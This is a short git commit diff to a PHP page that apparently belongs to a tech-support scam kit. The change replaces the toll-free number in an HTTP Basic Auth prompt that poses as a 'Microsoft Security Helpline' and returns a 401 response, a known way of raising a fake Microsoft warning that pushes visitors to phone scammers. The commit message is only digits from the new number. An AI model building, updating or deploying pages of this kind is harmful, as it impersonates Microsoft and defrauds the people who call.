727ab33753831cfaa239a48d6550ba794e14c084
joyhopson2023 <121514234+joyhopson2023@users.noreply.github.com>
2023-03-09 22:38:19 +0530

    5620

--- Win0HelplIEDine00Ash07/iy000D8.php
+++ Win0HelplIEDine00Ash07/iy000D8.php
@@ -14,7 +14,7 @@
             exit;
         } else {
 
-          header('WWW-Authenticate: Basic realm="Microsoft Security Helpline +1-888-570-1901 (Toll Free)."');
+          header('WWW-Authenticate: Basic realm="Microsoft Security Helpline +1-888-971-5620 (Toll Free)."');
           header('HTTP/1.0 401 Unauthorized');
 $page = $_SERVER['PHP_SELF'];
 $sec = "0";
